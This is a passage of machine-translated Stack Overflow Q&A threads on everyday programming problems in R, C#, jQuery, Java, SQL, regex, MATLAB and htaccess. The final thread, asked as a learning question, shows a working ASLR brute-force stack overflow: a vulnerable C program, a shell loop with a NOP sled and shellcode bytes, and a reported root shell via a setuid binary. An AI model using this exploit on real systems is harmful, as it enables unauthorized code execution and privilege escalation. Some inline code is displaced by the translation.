 [2,]    1    1    1
> matrix(2, nrow=3, ncol=3)
     [,1] [,2] [,3]
[1,]    2    2    2
[2,]    2    2    2
[3,]    2    2    2
> m1 <- matrix(1, nrow=2, ncol=3)
> m2 <- matrix(2, nrow=3, ncol=3) 
```

现在我们可以在一个列表中有很多矩阵，假设我们只有两个：

```
l <- list(m1, m2) 
```

我想实现类似：

```
> rbind(m1, m2)
     [,1] [,2] [,3]
[1,]    1    1    1
[2,]    1    1    1
[3,]    2    2    2
[4,]    2    2    2
[5,]    2    2    2 
```

我可以轻松地在 2 个矩阵上做到这一点，但我不确定如何使用矩阵列表来做到这一点。

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2013-04-19T17:46:39.487

采用`do.call(rbind,...)`

```
> m1 <- matrix(1, nrow=2, ncol=3)
> m2 <- matrix(2, nrow=3, ncol=3)
> l <- list(m1, m2)
> do.call(rbind, l)
     [,1] [,2] [,3]
[1,]    1    1    1
[2,]    1    1    1
[3,]    2    2    2
[4,]    2    2    2
[5,]    2    2    2 
```

您可能还对`rbind.fill.matrix()`“plyr”包中的函数感兴趣，它还可以让您绑定具有不同列的矩阵，并`NA`在必要时填写。

```
> m1 <- matrix(1, nrow=2, ncol=3)
> m2 <- matrix(2, nrow=3, ncol=4)
> l <- list(m1, m2)
> library(plyr)
> rbind.fill.matrix(l)
     1 2 3  4
[1,] 1 1 1 NA
[2,] 1 1 1 NA
[3,] 2 2 2  2
[4,] 2 2 2  2
[5,] 2 2 2  2 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-19T17:48:42.010

另一个选项 using `Reduce(...)`，但我认为效率低于`do.call`

```
m1 <- matrix(1, nrow=2, ncol=3)
m2 <- matrix(2, nrow=3, ncol=3)
l <- list(m1, m2)
Reduce(rbind, l)
   [,1] [,2] [,3]
[1,]    1    1    1
[2,]    1    1    1
[3,]    2    2    2
[4,]    2    2    2
[5,]    2    2    2 
```

Another option, if you have `data.frame` and not `matrix` , is to use `rbindlist` from `data.table` package. Here I convert to data.frame before calling it:

```
rbindlist(lapply(l,as.data.frame))
   V1 V2 V3
1:  1  1  1
2:  1  1  1
3:  2  2  2
4:  2  2  2
5:  2  2  2 
```

# actionscript-3 - 用于在 AS3 中部署 iOS 的带有计时器和确认框的长触摸事件

> ID：16110556
> 
> 赞同：0
> 
> 时间：2013-04-19T17:45:17.167
> 
> 标签：actionscript-3, flash-cs6

我有一个项目，其中有一个滚动列表。我希望我的用户能够“长按”列表中的项目，以便他们可以删除它。

我正在使用 Flash CS6 在 Air for iOS 中进行开发，所以我对 iOS 部署的适当 MultiTouch 手势知之甚少。

在我看来，我想像这样走的动画步骤..

1.  当 Long Touch 开始 + 计时器开始时，Item 影片剪辑中以前不可见的按钮 btn_delete 将出现
2.  中间步骤：btn_delete 将使用 TweenMax Rotate 旋转 90 度（我已经介绍过）
3.  最后一步：当计时器结束时，会弹出一个对话框/确认框并询问用户是否确定是否要删除该项目。

所以这是我快速编写的一些通用代码，让您了解我目前的结构（我省略了相互链接的侦听器函数）：

```
function exampleFunction {
    _item.addEventListener(TouchEvent.TOUCH_BEGIN, onTouchBegin);
}

//-- Long Press Listener Functions--//
function onTouchBegin(eBegin:TouchEvent) {
    trace("start");
}

function onTouchRotate(eEnd:TouchEvent) {
    trace("rotation of image");
}

function onTouchEnd(eEnd:TouchEvent) {
    trace("end");
} 
```

如果有人有一段他们已经编写的代码大致符合我的标准，那么请发布它！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:52:25.103

我会用`MouseEvent`这个。

```
var timer:Timer = new Timer( 500 ); //ms
timer.addEventListener( TimerEvent.TIMER_COMPLETE, timerCompleteHandler );

listItem.addEventListener( MouseEvent.MOUSE_DOWN, mouseDownHandler );

function mouseDownHandler( e:MouseEvent ):void {
    timer.start();
    stage.addEventListener( MouseEvent.MOUSE_UP, mouseUpHandler );
}

function mouseUpHandler( e:MouseEvent ):void {
    //just some clean up to reset the timer and remove the mouse up event listener from the stage 
    timer.reset();
    stage.removeEventListener( MouseEvent.MOUSE_UP, mouseUpHandler );
}

function timerCompleteHandler( e:TimerEvent ):void {
    timer.reset();
    stage.removeEventListener( MouseEvent.MOUSE_UP, mouseUpHandler );

    //do delete actions here
} 
```

因此，在鼠标按下时，您启动计时器并监听鼠标向上事件（在舞台上而不是组件上。这很重要。如果您想知道原因，请在组件上尝试并进行实验）。在鼠标向上时，您重置计时器，因此下次您向下鼠标时，它从 0 开始（reset() 具有停止计时器的额外好处）。计时器完成后，除了删除代码之外，您还可以执行与鼠标向上相同的操作。

我在这里使用 MouseEvent 只是因为它在此实例中的行为与 TouchEvent（大部分情况下）相同，并且可以在桌面上使用（这意味着您可以在模拟器中进行测试，如果需要，可以将其添加到其他项目中)

更新：只是重读你的问题，并意识到我错过了轮换。为此，只需添加另一个带有单独完整处理程序的计时器，并且在该函数中，仅执行旋转并重置该计时器。

# asp.net-mvc - 如何解决具有多层的构造函数注入

> ID：16110558
> 
> 赞同：2
> 
> 时间：2013-04-19T17:45:27.013
> 
> 标签：asp.net-mvc, asp.net-mvc-3, ninject

在我的项目中，我对 IRepositoryProvider 有一个控制器依赖项。

```
public class HomeController : BaseController
{
    public HomeController(ISessionWrapper sessionWrapper,
                          IRepositoryProvider repositoryProvider,
                          IApplicationConfiguration applicationConfiguration)
        : base(sessionWrapper, repositoryProvider, applicationConfiguration)
    {}

    ... 
```

}

IRepositoryProvider 及其实现位于 BLL 层中。另一件需要注意的是 IRepositoryProvider 也有一些参数。这些用于确定要使用的连接字符串（环境*5 可能的连接）。

```
 public RepositoryProvider(string environment, IApplicationConfiguration applicationConfiguration)
    {
        _applicationConfiguration = applicationConfiguration;
        _environment = environment;
    } 
```

这一切都适用于两层和这个 Ninject 配置。

```
kernel.Bind<IRepositoryProvider>()
      .To<RepositoryProvider>()
      .InRequestScope()
      .WithConstructorArgument("environment",    
                                context => context.Kernel.Get<ISessionWrapper>().CurrentEnvironment)
      .WithConstructorArgument("applicationConfiguration",
                                context => context.Kernel.Get<IApplicationConfiguration>()); 
```

当我引入服务层时，我的问题就出现了。我不想依赖控制器中的 IRepositoryProvider 进行数据访问，而是想使用服务层。理想情况下，我不想引用 BLL 层，而只想引用 Service 层。

```
public class HomeService : IHomeService
{
    public IRepositoryProvider RepositoryProvider { get; private set; }

    public HomeService(IRepositoryProvider repositoryProvider)
    {
        RepositoryProvider = repositoryProvider;
    }
    ...
} 
```

所以我的问题是：我是否可以不从 MVC 项目中同时引用 Service 和 BLL 层？或者这整个设置是否有大量代码气味？

谢谢。

更新：我想我应该说我的理想参考。网络 -> 服务 -> BLL。目前，Web 引用 Service 和 BLL 以便 Ninject 解决所有问题。

更新2：这似乎是一个可能的解决方案？[如何告诉 Ninject 绑定到它没有引用的实现](https://stackoverflow.com/questions/6241003/how-to-tell-ninject-to-bind-to-an-implementation-it-doesnt-have-a-reference-to)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:09:39.993

这就是我通常根据需求构建 MVC 项目的方式。

表示层 > 服务层 > 业务层 > 数据访问层。

表示层包含：ViewModels、Views、Controllers。（参考服务层，Ninject ddl）

服务层：WCF。（参考 BAL 等）

业务层：包含我所说的 Orchestrator 及其接口（参考 DAL、域）

数据访问层：包含存储库及其接口（参考域）

域：包含 POCO 对象

核心：我实际安装和配置 Ninject 的地方（参考 BAL、DAL 等）

要将 Ninject 添加到表示层以外的另一个项目：

将以下内容添加到 Global.Asasx.cs：

```
DependencyResolver.SetResolver(new NinjectDependencyResolver()); 
```

然后创建一个新项目sucche作为核心。在那里安装 Ninject 并添加以下类：

您需要从表示层引用 Ninject dll

```
 public class NinjectDependencyResolver : IDependencyResolver {
    private IKernel kernel;

    public NinjectDependencyResolver() 
    {
        kernel = new StandardKernel();
        AddBindings();
    }

    public object GetService(Type serviceType) 
    {
        return kernel.TryGet(serviceType);
    }

    public IEnumerable<object> GetServices(Type serviceType) 
    {
        return kernel.GetAll(serviceType);
    }

    public IBindingToSyntax<T> Bind<T>() 
    {
        return kernel.Bind<T>();
    }

    public IKernel Kernel 
    {
        get { return kernel; }
    }

    private void AddBindings() 
    {
        //Add your Bindings here
    }

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:22:56.877

> IRepositoryProvider 及其实现存在于 BLL 层中......我是否可以不同时引用 MVC 项目中的 Service 和 BLL 层

根据您的这两个陈述，答案是**否定**的，您“不”不可能引用这些层。最小化引用的最佳方法是将接口与实现分开。例如，您可以拥有以下内容：

**域层**，包含你的 POCO 和接口

*   产品（样本类）
*   IRepository（一个接口）

**服务层**，包含接口的实现

*   `Domain`对图层有参考
*   工具`IRepository`（例如`ProductRepository : IRepository`）

**依赖注入层**

*   知道`Domain`和`Service`层

**MVC 项目**

*   参考该`Domain`层以了解 POCO 和存储库签名
*   对图层有参考，`DI`但不知道它是如何工作的。所以你可以稍后换掉 DI 框架，一切仍然有效。

您可以根据需要扩展该层。您可以在and层`BLL`之间插入层，您不需要在任何地方引用它。`Domain``Service`

# c# - WinRT：StreamSocket TCP 的 DataReader.LoadAsync 异常

> ID：16110561
> 
> 赞同：5
> 
> 时间：2013-04-19T17:45:39.077
> 
> 标签：c#, winrt-async

我正在用 C# 在 WinRT 上编写一个客户端应用程序，它通过 TCP 连接到多个服务器。对于 TCP 连接，我使用 StreamSocket。然后将输入和输出字符串包装在 DataWriter 和 DataReader 中。当我连接到多个服务器时，出现以下异常：“操作标识符无效”

这是该方法的代码：

```
private async void read()
    {
        while (true)
        {
            uint bytesRead = 0;
            try
            {
                bytesRead = await reader.LoadAsync(receiveBufferSize);

                if (bytesRead == 0)
                {
                    OnClientDisconnected(this);
                    return;
                }
                byte[] data = new byte[bytesRead];
                reader.ReadBytes(data);
                if (reader.UnconsumedBufferLength > 0)
                {
                    throw new Exception();
                }

                OnDataRead(this, data);
            }
            catch (Exception ex)
            {
                if (Error != null)
                    Error(this, ex);
            }

            new System.Threading.ManualResetEvent(false).WaitOne(10);

        }
    } 
```

Stacktrace 仅将 reader.LoadAsync(UInt32 count) 方法显示为问题的根源。每个 ClientInstance 都在自己的任务中运行，并拥有自己的 DataReader 和 Stream 实例。“receiveBufferSize”为 8192 字节。

你知道错误可能是什么吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-20T09:11:21.097

我想我现在可以自己回答我的问题了。问题是 LoadAsync 方法不能很好地与 await/async 构造一起使用。该方法由 ThreadPool 线程 A 调用，然后由 ThreadPool 线程 B 恢复（等待之后）。这个星座抛出了异常。但我不能确切地说为什么...

有了这个答案（[如何将 WinRT 异步任务集成到现有的同步库中？](https://stackoverflow.com/questions/12822694/how-to-integrate-winrt-asynchronous-tasks-into-existing-synchronous-libraries)）我将 LoadAsync 方法写入同步方法，现在它可以工作了，因为同一个线程正在调用该方法并使用它的结果。

这是修改后的代码片段：

```
IAsyncOperation<uint> taskLoad = reader.LoadAsync(receiveBufferSize);
taskload.AsTask().Wait();
bytesRead = taskLoad.GetResults(); 
```

感谢 Geoff 让我走上了正确的道路:) 我希望我能帮助那些也（将会）遇到这个问题的人。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:08:46.677

在我看来，异常的可能原因是[文档](http://msdn.microsoft.com/en-us/library/ee652610%28v=vs.95%29.aspx)中的这段：

> 当先前对 LoadAsync 的调用尚未完成时。

进一步阅读：

> LoadAsync 方法只能在 UI 线程上调用一次。在引发 LoadCompleted 事件之前，无法再次调用该方法。无论查询是否成功，都会引发 LoadCompleted 事件。

然后，将它与为什么 async/await 不仅仅是纯粹的魔法酱的[这个非常彻底的答案结合起来：](https://stackoverflow.com/a/9898995/55487)

> [...]await 不会神奇地导致同步方法异步运行。例如，它不会启动新线程并在新线程上运行该方法。

所以看起来第二次调用`LoadAsync()`是在第一次完成之前发生的；两者都是由同一个 UI 线程制成的。

# jquery - 仅隐藏/显示最接近的班级

> ID：16110565
> 
> 赞同：0
> 
> 时间：2013-04-19T17:45:44.103
> 
> 标签：jquery

我有多组是/否单选按钮，它们根据单选值隐藏或显示 div。如何仅选择最接近的 div 到已更改的单选按钮集？

[http://jsfiddle.net/infatti/esLMh/](http://jsfiddle.net/infatti/esLMh/)

这可行，但会更改页面上的所有 div，而不仅仅是最接近的。

```
$('.hide-show input').change(function() {
  $('.hide-show-yes').toggle(this.value == 'yes');
  $('.hide-show-no').toggle(this.value == 'no');
});
$('.hide-show input:checked').change(); //trigger correct state onload 
```

当页面上有多个集合时，如何仅影响最接近收音机的 div？

```
$('.hide-show input').change(function() {
  $(this).next('.hide-show-yes').toggle(this.value == 'yes').next('hide-show-no').toggle(this.value == 'no');
});
$('.hide-show input:checked').change(); //trigger correct state onload 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:55:26.357

您需要访问单选按钮的父div的下一个元素，您可以这样做

**[现场演示](http://jsfiddle.net/rajaadil/esLMh/4/)**

```
$('.hide-show input').change(function() {
  $(this).closest('div').next('.hide-show-yes').toggle(this.value == 'yes');
  $(this).closest('div').next('.hide-show-no').toggle(this.value == 'no');
});
$('.hide-show input:checked').change(); //trigger correct state onload 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:02:57.113

```
$('.hide-show input').change(function() {    
  $(this).parent().next().toggle(this.value == 'yes');
  $(this).parent().next().next().toggle(this.value == 'no');
});
$('.hide-show input:checked').change(); //trigger correct state onload 
```

[JSFIDDLE](http://jsfiddle.net/esLMh/6/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T17:51:54.393

给你的输入字段一个id，你可以控制id，这样你就可以做类似的事情

```
$('#radioButtonOne').change(function() { 
```

和

```
$('#radioButtonTwo').change(function() { 
```

这样您就可以始终确保知道正在更改的内容，并根据更改执行不同的功能。

我还建议每个状态只有一个 div，因此您可以更改 div 的文本，而不是隐藏和显示多个 div。

我还建议使用 on jquery 函数，这样您就可以更改 DOM，但仍然能够侦听您可能创建的 NEW 元素。

```
 $("#radioButtonOne").on("change", function(event){ 
```

# java - 如何从渲染器中的 JCombobox 获取数据？

> ID：16110568
> 
> 赞同：0
> 
> 时间：2013-04-19T17:45:50.293
> 
> 标签：java, swing, autocomplete, jcombobox, glazedlists

我需要开发带有弹出列表的自动完成组合框。该列表的每一行都应突出显示输入自动完成数据。
我使用 glazedlists 进行自动完成。但最困扰我的是如何在渲染器中突出显示输入的组合框数据？
它应该看起来像这样
![1](https://pp.vk.me/c409818/v409818896/6ef/UWBPuj36WaQ.jpg)

更新：
我只想知道如何将输入的字符串从 jcombobox 编辑器发送到列表渲染器。我是否使用 glazedlists 并不重要。

不知何故，我发现我可以将组合框发送到渲染器并从渲染器中的组合框获取信息。但问题是我需要比现在更频繁地调用 getListCellRendererComponent。有谁知道，我怎样才能让组合框调用渲染器 getListCellRendererComponent 更频繁？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:43:34.403

这个有可能。但是做起来有点辛苦。
这是我发现的用于更改 JList 元素的示例代码。

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.event.*;

class ListDemo extends JPanel {
    private JList list;
    private DefaultListModel listModel;
    public String match = null;

    private static final String hireString = "Highlight";
    private JTextField employeeName;

    public ListDemo() {
        super(new BorderLayout());

        listModel = new DefaultListModel();
        listModel.addElement("Test1");
        listModel.addElement("Test2");
        listModel.addElement("Test3");

        list = new JList(listModel);
        list.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        list.setSelectedIndex(0);
        list.setVisibleRowCount(5);
        list.setCellRenderer(new MyListCellRenderer());
        JScrollPane listScrollPane = new JScrollPane(list);

        JButton hireButton = new JButton(hireString);
        HireListener hireListener = new HireListener(hireButton);
        hireButton.setActionCommand(hireString);
        hireButton.addActionListener(hireListener);
        hireButton.setEnabled(false);

        employeeName = new JTextField(10);
        employeeName.addActionListener(hireListener);
        employeeName.getDocument().addDocumentListener(hireListener);

        JPanel buttonPane = new JPanel();
        buttonPane.setLayout(new BoxLayout(buttonPane,
                                           BoxLayout.LINE_AXIS));
        buttonPane.add(Box.createHorizontalStrut(5));
        buttonPane.add(employeeName);
        buttonPane.add(hireButton);
        buttonPane.setBorder(BorderFactory.createEmptyBorder(5,5,5,5));

        add(listScrollPane, BorderLayout.CENTER);
        add(buttonPane, BorderLayout.PAGE_END);
    }
    class MyListCellRenderer extends JLabel implements ListCellRenderer { // extended from JLabel. You can use an appropriate JComponent.
        public MyListCellRenderer() {
            setOpaque(true);
        }
        public Component getListCellRendererComponent(JList paramlist, Object value, int index, boolean isSelected, boolean cellHasFocus) {
            setText(value.toString());
            if (value.toString().equals(match)) {
                setBackground(Color.BLUE);
                SwingWorker worker = new SwingWorker() {
                    @Override
                    public Object doInBackground() {
                        try {
                            Thread.sleep(5000);
                        } catch (InterruptedException e) { /*Who cares*/ }
                        return null;
                    }
                    @Override
                    public void done() {
                        match = null;
                        list.repaint();
                    }
                };
                worker.execute();
            } else
                setBackground(Color.RED);
            return this;
        }
    }
    class HireListener implements ActionListener, DocumentListener {
        private boolean alreadyEnabled = false;
        private JButton button;
        public HireListener(JButton button) {
            this.button = button;
        }
        public void actionPerformed(ActionEvent e) {
            String name = employeeName.getText();
            if (listModel.contains(name)) {
                match = name;
                list.repaint();
                employeeName.requestFocusInWindow();
                employeeName.selectAll();
                return;
            }
            if (name.equals("")) {
                Toolkit.getDefaultToolkit().beep();
                employeeName.requestFocusInWindow();
                employeeName.selectAll();
                return;
            }
            int index = list.getSelectedIndex();
            if (index == -1)
                index = 0;
            else
                index++;
            listModel.insertElementAt(employeeName.getText(), index);
            employeeName.requestFocusInWindow();
            employeeName.setText("");
            list.setSelectedIndex(index);
            list.ensureIndexIsVisible(index);
        }
        public void insertUpdate(DocumentEvent e) {
            enableButton();
        }
        public void removeUpdate(DocumentEvent e) {
            handleEmptyTextField(e);
        }
        public void changedUpdate(DocumentEvent e) {
            if (!handleEmptyTextField(e))
                enableButton();
        }
        private void enableButton() {
            if (!alreadyEnabled)
                button.setEnabled(true);
        }
        private boolean handleEmptyTextField(DocumentEvent e) {
            if (e.getDocument().getLength() <= 0) {
                button.setEnabled(false);
                alreadyEnabled = false;
                return true;
            }
            return false;
        }
    }
    private static void createAndShowGUI() {
        JFrame frame = new JFrame("ListDemo");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        JComponent newContentPane = new ListDemo();
        newContentPane.setOpaque(true);
        frame.setContentPane(newContentPane);
        frame.pack();
        frame.setVisible(true);
    }
    public static void main(String[] args) {
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run() { createAndShowGUI(); }
        });
    }
} 
```

如果你对java有点好，你就会清楚地了解这里做了什么。
（抱歉，我找不到此代码的链接。只是复制了我的本地代码。）您可以使用`getComboBox()`您的 glazedists 的方法获取相应的`JComboBox`和；

```
JList l = new JList();
l.setModel(glazedlist1.getComboBox().getModel()); // glazedlist1 -> your auto complete list 
```

将该组合框的模型分配给新的`JList`.
您可以单独更改文本的扩展名或格式化`class MyListCellRenderer extends JLabel implements...`文本`JTextPane`。 希望这会有所帮助。 抱歉代码不完整。`JEditorPane`

# iphone - 使用自动布局水平居中子视图

> ID：16110569
> 
> 赞同：1
> 
> 时间：2013-04-19T17:45:58.477
> 
> 标签：iphone, objective-c, alignment, autolayout

我有两个子视图， an`UILabel`和 an `UIImageView`，我想在视图中居中。它们应该彼此相邻放置，并且它们应该一起位于其宽度已知的父视图的中心。

我还希望能够在视图之间添加一些间距。

这可以通过自动布局实现吗？

```
-------------------------------
|           Superview         |
|                             |
|     [label] [imageview]     |
------------------------------- 
```

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-04-19T17:52:44.783

将标签和图像视图包装在 wrapview 中

然后使用自动调整wrapview

```
view.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin; 
```

![在此处输入图像描述](https://i.stack.imgur.com/aH84O.png)

# sql - 从多个表中获取数据并执行计算

> ID：16110570
> 
> 赞同：0
> 
> 时间：2013-04-19T17:46:01.580
> 
> 标签：sql, oracle, join, sum

基本上我有 3 个表，一个包含 id、类型和价格的产品表，一个包含 id、客户 id 的订单表和一个包含 order_id、飞机 id（都连接以制作复合材料）和数量的流程表。

我希望能够显示客户 ID、订单 ID、类型和数量，现在每个客户可以有多个具有相同订单 ID 的订单。然后，我希望能够根据该客户订购的数量计算总数。

有什么我可以使用的想法吗？例如非等连接或内连接、选择语句、求和函数。因为我不确定哪种方法更容易

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:55:42.173

Use inner join on the three tables , group by customerId and apply sum() function on quantity . Also whatever columns that you retrieve in Select clause should be mentioned in Group by clause or have some aggregate function applied on them.

# javascript - 两个词之间的空格

> ID：16110572
> 
> 赞同：0
> 
> 时间：2013-04-19T17:46:07.313
> 
> 标签：javascript, regex

我正在寻找一个正则表达式来检查我的输入字段中是否至少有两个单词。

我试过这个：

`var spaceReg = /^\w+\s\w+$/`

它工作得很好，但如果我有三个或更多的词，不再是（或者如果我有一个像 meyer-miller 这样的词）。

我的下一次尝试是这样的：

`/^(?:[\w-]+ ?)*$/`

但是如果我在第一个单词的末尾有一个空格并且只有一个单词，这也有效。

有专家来帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:47:18.777

只需不要添加字符串标记的开始和结束：

```
var spaceReg =  /\w\s+\w/ 
```

如果您还想确保除了单词和空格之外什么都没有，那么您可以使用

```
var spaceReg =  /^\w+\s+\w[\w\s]*$/ 
```

如果您想在开始时允许空格（从您的问题中不确定）和破折号（从评论中），请使用

```
var spaceReg =  /^\s*[\w-]+\s+[\w-][\w-\s]*$/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:49:29.440

编辑：我原本以为你想要用破折号分隔的单词来匹配..试试这个：http: [//jsfiddle.net/YbWYp/8/](http://jsfiddle.net/YbWYp/8/)

```
var spaceReg =  /[\-\w]+\s[\-\w]+/ 
```

编辑：另外，如果您只是想确保在您正在测试的字符串中的某个非空格内有一些空格，您可以做一些简单的事情：http: [//jsfiddle.net/YbWYp/10/](http://jsfiddle.net/YbWYp/10/)

```
var pattern = /\S\s\S/ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T17:51:33.477

```
1.8.7 :004 > "asd asdasd "=~ /\w+(\s\w+)+/ 
 => 0 
1.8.7 :005 > "asd asdasd"=~ /\w+(\s\w+)+/ 
 => 0 
1.8.7 :006 > "asd asdasd asd"=~ /\w+(\s\w+)+/ 
 => 0 
1.8.7 :007 > "asd"=~ /\w+(\s\w+)+/ 
```

可以在\s右边加*来支持多个空格

# matlab - Matlab - 替换所有负值和正值

> ID：16110585
> 
> 赞同：1
> 
> 时间：2013-04-19T17:46:56.427
> 
> 标签：matlab

我有一个包含许多通道和许多试验的数据集（每个都对应一个单独的 .mat 文件或数据数组）。

我想用 -1 替换所有负值，用 +1 替换所有正值（对于 i = 1:n（试验次数））用 +1 替换 (22,:) 中的所有正值和所有负值-1 的值）。

希望这很清楚。

非常感谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-19T18:02:16.510

如果 A 是您的矩阵 NxN。

做

```
A(X,:) = sign(A(X,:)); 
```

其中 X 是您要更改的行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:00:49.933

如果我理解正确，您需要做的就是这个，假设您的输入矩阵是`A`并且您想要更改它第 22 行中的值：

```
A(22,(A(22,:)<0)) = -1;
A(22,(A(22,:)>0)) = 1; 
```

例如：

```
>> A = randint(25,5,[-10,10]);
>> A(22,:)

ans =

   -10    -1    -5     1    10

>> A(22,(A(22,:)<0)) = -1;
>> A(22,(A(22,:)>0)) = 1;
>> A(22,:)

ans =

   -1    -1    -1     1    1 
```

# apache - htaccess 防止热链接也可以防止外部链接

> ID：16110587
> 
> 赞同：2
> 
> 时间：2013-04-19T17:47:11.683
> 
> 标签：apache, .htaccess

我的 .htaccess 文件中有此代码，以防止图像和 pdf 文件的热链接，但它也阻止了正常的外部链接工作。我的 htaccess 文件：

```
RewriteEngine On
RewriteCond %{HTTP_REFERER} !^$
RewriteCond %{HTTP_REFERER} !^http://(www\.)?mywebsite.com/.*$ [NC]
RewriteRule .*\.(gif|jpg|pdf|png)$ http://www.mywebsite.com/images/notallowed.jpe [NC,R,L] 
```

问题是一个合法的外部链接说一个 pdf 文件将导致替换图像而不是 pdf 文件出现。¿ 这是正常的还是我做错了什么/错过了什么？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T20:39:50.880

我会试试这个...

```
RewriteCond %{HTTP_REFERER} ^$ [OR]
RewriteCond %{HTTP_REFERER} !^https?://(?:www\.)?mywebsite\.com(?:$|/) [NC] [OR]
# Repeat the next line as needed for each allowed site
RewriteCond %{HTTP_REFERER} !^https?://(?:www\.)?allowedsite1\.com(?:$|/) [NC] [OR]
RewriteCond %{HTTP_REFERER} !^https?://(?:www\.)?allowedsite2\.com(?:$|/) [NC]
RewriteRule ^(.*)\.(gif|jpg|pdf|png) http://www.mywebsite.com/images/notallowed.jpe [NC,R,L] 
```

手动添加每个允许的站点可能有点不方便，但它*应该*给你一些控制......其他可能的缺点是访问原始图像的人，例如，必须通过在地点。

示例：`http://www.mywebsite.com/logo.png`在您的浏览器中输入并尝试*直接*查看该文件`logo.png`是行不通的，**但**如果您单击 .查看同一个文件应该没有问题`<a href="http://www.mywebsite.com/logo.png"><img src="http://www.mywebsite.com/logo.png" /></a>`。

希望对某人有所帮助...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-08T20:56:43.113

改用[SetEnvIf](https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html)：

```
SetEnvIf Referer ^http remote

<FilesMatch "\.(png|gif|jpg|pdf)">
  order deny,allow
  deny from env=remote
  allow from all
</FilesMatch> 
```

# javascript - 为什么没有触发 jQuery 页面事件？

> ID：16110589
> 
> 赞同：0
> 
> 时间：2013-04-19T17:47:25.240
> 
> 标签：javascript, jquery-mobile

我有带有 2 个 JQM 页面的简单 html：

```
<!DOCTYPE html> 
<html> 
<head> 
    <title>Test table</title> 
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.1/jquery.mobile-1.3.1.min.css" />
    <script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.3.1/jquery.mobile-1.3.1.min.js"></script>
    <script>
        $(function(event, ui) {
            console.log('Whole document (+page 1) ready');
        });

        // Unreachable - doesn't matter which event is "on"
        $('#page_test2').on('pagecreate', function(event, ui) {
            console.log('Page 2 create event fired');
        });
    </script>
</head> 
<body>
    <div data-role="page" id="page_test1">
        <div data-role="content">
            <a href="#page_test2" data-role="button">Open next page</a>
        </div>
    </div>
    <div data-role="page" id="page_test2">
        <div data-role="content">
            <a href="#" data-role="button" data-rel="back">Return to first page</a>
            <div id="place">
            </div>
        </div>
    </div>
</body>
</html> 
```

发现使用“on”未到达 page2 事件处理程序。怎么了？在这里，我发现了许多答案很不清楚的长主题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:53:36.350

将事件侦听器应用于文档：

```
$(document).on('pagecreate', '#page_test2', function() {
    //...
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:50:59.523

当您注册事件时，该`#page_test2`div 不存在。您需要将事件注册包装在`$(document).ready()`调用中，以便在设置事件时拥有所有 DOM 元素。

像这样：

```
$(document).ready(function() {
 $('#page_test2').on('pagecreate', function(event, ui) {
            console.log('Page 2 create event fired');
        });
}); 
```

您还可以将代码移动到 div 的声明下方，这样它们在执行 javascript 时出现在 DOM 中。

# c - ASLR蛮力

> ID：16110591
> 
> 赞同：4
> 
> 时间：2013-04-19T17:47:38.943
> 
> 标签：c, buffer-overflow, aslr

我刚刚阅读了有关地址空间布局随机化的内容，并尝试了一个*非常*简单的脚本来尝试暴力破解它。这是我用来测试一些东西的程序。

```
#include <stdio.h>
#include <string.h>

int main (int argc, char **argv)
{
    char buf[8];
    printf("&buf = %p\n", buf);
    if (argc > 1 && strcpy(buf, argv[1]));
    return 0;
} 
```

我用这个命令编译它：

```
gcc -g -fno-stack-protector -o vul vul.c 
```

我确保启用了 ASLR：

```
$ sysctl kernel.randomize_va_space
kernel.randomize_va_space = 2 
```

然后，我想出了这个简单的脚本：

```
str=`perl -e 'print "\x40\xfa\xbb\xbf"x10 \
    . "\x90"x65536                        \
    . "\x31\xc0\x40\x89\xc3\xcd\x80"'`

while [ $? -ne 1 ]; do
    ./vul $str
done 
```

格式是

```
return address many times | 64KB NOP slide | shellcode that runs exit(1) 
```

运行此脚本几秒钟后，它会以我想要的错误代码 1 退出。我还尝试了其他调用 execv("/bin/sh", ...) 的 shellcode，我也成功了。

我觉得很奇怪，即使在返回地址之后也可以创建这么长的 NOP 幻灯片。我认为 ASLR 更有效，我错过了什么吗？是不是因为地址空间太小了？

**编辑**：我做了一些额外的研究，这是我发现的：

*   我请朋友在他的 64b 计算机上运行此代码`-m32 -z execstack`，稍微更改返回地址后，他得到了相同的结果。

*   即使我没有使用`-z execstack`，我还是设法执行了 shellcode。我通过使用不同的 shellcode 来确保这一点，这些 shellcode 都做了他们应该做的事情（即使是众所周知的场景`chown root ./vul`，，然后`chmod +s ./vul`运行的 shellcode，最后在生成的 shell 中返回“root”）。这很奇怪，因为告诉我可执行堆栈标志位未设置。有谁知道为什么？`setreuid(0, 0)``execv("/bin/sh", ...)``whoami``execstack -q ./vul`

* * *

## 回答 #1
